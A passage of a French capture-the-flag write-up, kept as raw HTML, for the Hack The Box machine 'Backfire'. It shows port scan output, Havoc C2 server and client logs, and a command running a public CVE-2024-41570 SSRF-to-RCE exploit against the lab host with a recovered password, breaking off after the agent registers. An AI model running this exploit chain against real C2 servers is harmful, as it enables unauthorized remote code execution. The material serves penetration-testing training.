&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">443&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">https&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">5000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">upnp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">7096&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">8000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">alt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;h2 id="user-ilya">User Ilya
&lt;/h2>&lt;h3 id="exploit-havoc-c2-srf--rce">Exploit Havoc C2: SRF + RCE
&lt;/h3>&lt;p>Un directory listing accessible via le port 8000 nous permet de récupérer deux fichiers:&lt;/p>
&lt;ul>
&lt;li>&lt;code>disable.tls.patch&lt;/code>: Il nous indique que TLS est désactivé pour le port 40056 permettant ainsi une connexion non sécurisée via WebSocket.&lt;/li>
&lt;li>&lt;code>havoc.yaotl&lt;/code>: Un fichier de configuration pour le framework C2 &lt;a class="link" href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noopener"
>Havoc&lt;/a>.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/DL-Backfire.PNG"
width="500"
height="153"
srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/DL-Backfire_hu_eb374eaa37102dc2.PNG 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/DL-Backfire_hu_5ec44830e48e9964.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="326"
data-flex-basis="784px"
>&lt;/p>
&lt;p>Ces fichiers suggèrent que l&amp;rsquo;exploitation reposera sur une ou plusieurs vulnérabilités liées à un serveur de commande et contrôle (C2) Havoc.&lt;/p>
&lt;p>Après quelques recherches, on tombe sur cet exploit: &lt;a class="link" href="https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE" target="_blank" rel="noopener"
>https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE&lt;/a>&lt;br>
Cet exploit combine deux vulnérabilités:&lt;/p>
&lt;ul>
&lt;li>la CVE-2024-41570, qui permet d’exploiter une faille SSRF pour ouvrir un socket TCP sur le serveur principal (teamserver) et d’y lire ou écrire des données.&lt;/li>
&lt;li>une injection de commandes autorisant un utilisateur authentifié à exécuter des commandes sur ce même serveur.&lt;/li>
&lt;/ul>
&lt;p>Une fois l&amp;rsquo;installation du framework Havoc éffectuée, on lance le serveur et le client:
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span> &lt;span class="nx">server&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">verbose&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">debug&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">profile&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Téléchargements&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">yaotl&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">│\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)(&lt;/span> &lt;span class="nx">____&lt;/span> &lt;span class="err">\&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">____&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">\&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\││&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\│&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pwn&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">elevate&lt;/span> &lt;span class="nx">until&lt;/span> &lt;span class="nx">it&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">DBUG&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">init&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">func2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">]:&lt;/span> &lt;span class="nx">Debug&lt;/span> &lt;span class="nx">mode&lt;/span> &lt;span class="nx">enabled&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">Framework&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Version&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">0.7&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">CodeName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Bites&lt;/span> &lt;span class="nx">The&lt;/span> &lt;span class="nx">Dust&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">profile&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Téléchargements&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">yaotl&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Build&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">Compiler&lt;/span> &lt;span class="nx">x64&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">data&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">x86_64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">cross&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">x86_64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">gcc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">Compiler&lt;/span> &lt;span class="nx">x86&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">data&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">i686&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">cross&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">i686&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">gcc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">Nasm&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">nasm&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Time&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mo">04&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mo">06&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2025&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Client-Havoc.png"
width="505"
height="288"
srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Client-Havoc_hu_d59ee651e3ee545e.png 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Client-Havoc_hu_efc7451f6cb1d4b1.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="175"
data-flex-basis="420px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span> &lt;span class="nx">client&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">│\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)(&lt;/span> &lt;span class="nx">____&lt;/span> &lt;span class="err">\&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">____&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">\&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\││&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\│&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pwn&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">elevate&lt;/span> &lt;span class="nx">until&lt;/span> &lt;span class="nx">it&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">Framework&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Version&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">0.7&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">CodeName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Bites&lt;/span> &lt;span class="nx">The&lt;/span> &lt;span class="nx">Dust&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">loaded&lt;/span> &lt;span class="nx">config&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">config&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">toml&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Connecting&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">profile&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">HTB&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">&amp;gt;:&lt;/span>&lt;span class="mi">114&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">SyntaxWarning&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">invalid&lt;/span> &lt;span class="nx">escape&lt;/span> &lt;span class="nx">sequence&lt;/span> &lt;span class="err">&amp;#39;\&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Started&lt;/span> &lt;span class="s">&amp;#34;Demon Listener&amp;#34;&lt;/span> &lt;span class="nx">listener&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>On lance l&amp;rsquo;exploit en utilisant le compte d&amp;rsquo;&lt;code>Ilya&lt;/code> récupéré dans le fichier &lt;code>havoc.yaotl&lt;/code> et on exécute la commande suivante afin d&amp;rsquo;obtenir un reverse shell sur le serveur:
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
&lt;/span>&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">python3&lt;/span> &lt;span class="nx">CVE&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2024&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">41570.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//10.10.11.49 -i 127.0.0.1 -p 40056 -U ilya -P &amp;#39;CobaltStr1keSuckz!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">register&lt;/span> &lt;span class="nx">agent&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
